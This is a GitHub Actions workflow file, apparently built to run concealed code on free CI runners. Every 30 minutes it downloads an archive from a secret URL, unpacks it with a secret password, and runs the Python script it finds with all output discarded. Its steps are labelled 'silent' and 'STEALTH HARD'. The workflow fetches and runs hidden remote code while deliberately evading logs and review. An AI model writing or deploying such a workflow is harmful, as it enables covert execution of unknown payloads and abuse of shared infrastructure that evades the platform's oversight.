name: Windows Worker

on:
  workflow_dispatch:
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: worker
  cancel-in-progress: true

jobs:
  worker:
    runs-on: windows-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v3

      - name: Prepare dependencies (silent)
        shell: powershell
        run: |
          choco install 7zip -y --no-progress > $null

      - name: Download package (silent)
        shell: powershell
        env:
          SRC_URL: ${{ secrets.LINK }}
        run: |
          $ProgressPreference = 'SilentlyContinue'
          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null

      - name: Extract package (silent)
        shell: powershell
        env:
          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
        run: |
          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null

      - name: Run worker (STEALTH HARD + AUTO CONFIG)
        shell: powershell
        run: |
          $ErrorActionPreference = 'SilentlyContinue'
          $env:NODE_NO_WARNINGS = "1"

          # Cari config.json dulu
          $config = Get-ChildItem extracted -Recurse -Filter config.json | Select-Object -First 1
          if (-not $config) { exit 0 }

          # Ambil folder tempat config berada
          $workDir = $config.Directory.FullName

          # Cari file python di folder yang sama
          $pyFile = Get-ChildItem $workDir -Filter *.py | Select-Object -First 1
          if (-not $pyFile) { exit 0 }

          # Masuk ke folder tersebut
          cd $workDir

          # Jalankan tanpa log
          cmd /c "python `"$($pyFile.Name)`" > nul 2>&1"
